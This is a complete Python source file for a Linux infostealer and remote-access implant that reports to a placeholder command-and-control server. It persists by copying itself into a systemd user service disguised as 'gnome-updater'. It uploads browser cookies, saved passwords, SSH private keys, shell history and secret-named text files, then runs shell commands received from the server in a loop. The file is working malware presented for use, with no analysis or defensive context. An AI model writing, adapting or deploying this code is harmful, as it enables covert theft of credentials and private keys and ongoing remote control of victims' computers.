import http.client, socket, requests
import os, subprocess, shutil
import json, time

HOST = "{C2_IP}" # Replace with your C2 server IP
PORT = 80

def persistence():
    try:
        user_home = os.path.expanduser("~")
        dir = os.path.join(user_home, ".local", "share")
        filename = "gnome-updater.py"
        path = os.path.join(user_home, dir, filename)

        current_path = os.path.abspath(__file__)

        if current_path == path:
            return

        if not os.path.exists(dir):
            os.makedirs(dir, exist_ok=True)

        shutil.copyfile(current_path, path)
        os.chmod(path, 0o755)

        systemd_user_dir = os.path.join(user_home, ".config", "systemd", "user")

        if not os.path.exists(systemd_user_dir):
            os.makedirs(systemd_user_dir, exist_ok=True)

        service_name = "gnome-updater.service"
        service_path = os.path.join(systemd_user_dir, service_name)
        service_content = f"""[Unit]
    Description=GNOME Updater

    [Service]
    ExecStart=/usr/bin/python3 {path}
    Restart=always

    [Install]
    WantedBy=default.target
    """

        with open(service_path, 'w') as service_file:
            service_file.write(service_content)

        subprocess.run(["systemctl", "--user", "daemon-reload"], check=True)
        subprocess.run(["systemctl", "--user", "enable", service_name], check=True)
        subprocess.run(["systemctl", "--user", "start", service_name], check=True)

        exit()

    except Exception as e:
        print(f"Persistence failed: {e}")
        pass

def send_data_to_c2(data, path):
    try:
        conn = http.client.HTTPConnection(HOST, PORT)
        conn.request("POST", path, data.encode('utf-8'))
        response = conn.getresponse()
        print(f"[{time.ctime()}] Operation completed. Status: {response.status}")
        conn.close()
        return response.status
    except (http.client.HTTPException, socket.error) as e:
        print(f"[{time.ctime()}] Operation failed")
        return None
    
def send_file_to_c2(file_path, login, password):
    try:
        with open(file_path, 'rb') as file:
            files = {
                'file': (os.path.basename(file_path), file.read(), 'application/octet-stream')    
            }
            conn = http.client.HTTPConnection(HOST, PORT)
            data = {
                'login': login,
                'password': password,
                'file': file_path
            }

            response = requests.post(f"http://{HOST}:{PORT}/admin", files=files, data=data)
            if response.status_code == 200:
                pass
            else:
                print(f"[{time.ctime()}] Failed to Login")
            return response.status_code
            
    except (http.client.HTTPException, socket.error, FileNotFoundError) as e:
        print(f"[{time.ctime()}] Login and password sending failed.")
        return None

def fetch_command(path="/loopback"):
    try:
        conn = http.client.HTTPConnection(HOST, PORT)
        conn.request("POST", path)
        response = conn.getresponse()
        if response.status == 200:
            command_data = json.loads(response.read().decode())
            conn.close()
            return command_data.get("command")
        else:
            conn.close()
            return None
    except (http.client.HTTPException, socket.error, json.JSONDecodeError) as e:
        print("Loopback failed.")
        return None

def execute_command(cmd):
    try:
        proc = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            stdin=subprocess.DEVNULL,
            text=True
        )
        output, _ = proc.communicate(timeout=10)
        return output or ""
    except Exception:
        return ""

def collect_sensitive_files_linux(login):
    user_home = os.path.expanduser("~")
    
    search_paths = [
        os.path.join(user_home, ".mozilla", "firefox"),
        os.path.join(user_home, ".config", "chromium"),
        os.path.join(user_home, ".ssh"),
        user_home
    ]
    
    files_to_look_for = {
        "cookies.sqlite": "browser_cookies",
        "logins.json": "browser_logins",
        "places.sqlite": "browser_history",
        "Login Data": "browser_passwords",
        "Web Data": "browser_webdata",
        "History": "browser_history_chromium",
        ".bash_history": "shell_history",
        "id_rsa": "ssh_private_key",
        "id_ed25519": "ssh_private_key",
        "id_dsa": "ssh_private_key",
        "config": "ssh_config",
    }

    sensitive_text_file_keywords = ["backup", "codes", "secrets", "passwords", "credentials"]

    found_files_info = {}

    for base_path in search_paths:
        if not os.path.exists(base_path):
            continue

        for root, dirs, files in os.walk(base_path):
            for file_name in files:
                full_path = os.path.join(root, file_name)

                if file_name in files_to_look_for:
                    file_category = files_to_look_for[file_name]
                    send_file_to_c2(full_path, login, file_category)
                    found_files_info[full_path] = True
                    continue

                found_keyword = None
                if file_name.lower().endswith(".txt"):
                    for keyword in sensitive_text_file_keywords:
                        if keyword.lower() in file_name.lower():
                            found_keyword = keyword
                            break

                if found_keyword:
                    file_category = f"sensitive_text_{found_keyword}"
                    send_file_to_c2(full_path, login, file_category)
                    found_files_info[full_path] = True

    return found_files_info

def collect_system_info():
    try:
        uname_info = subprocess.check_output("uname -a", shell=True).decode().strip()
        kernel_version = subprocess.check_output("uname -r", shell=True).decode().strip()
        os_version = subprocess.check_output("cat /etc/os-release", shell=True).decode().strip()
        send_data_to_c2(uname_info, "/login")
        send_data_to_c2(kernel_version, "/login")
        send_data_to_c2(os_version, "/login")
        return "Completed!"
    except subprocess.CalledProcessError as e:
        return f"Failed to complete!"

def main():

    persistence()

    collect_system_info()
    login = subprocess.run("whoami", capture_output=True, text=True).stdout.strip()
    collect_sensitive_files_linux(login)

    while True:
        command_to_execute = fetch_command()

        if command_to_execute:
            command_to_execute = command_to_execute.strip()
            if command_to_execute:
                if command_to_execute.lower() == "exit":
                    break
                
                command_output = execute_command(command_to_execute)

                send_data_to_c2(f"'{command_to_execute}':\n{command_output}", "/register")
            else:
                print(f"[{time.ctime()}] Empty.")
        else:
            print(f"[{time.ctime()}] Nothing occurred.")

        time.sleep(5)

if __name__ == "__main__":
    main()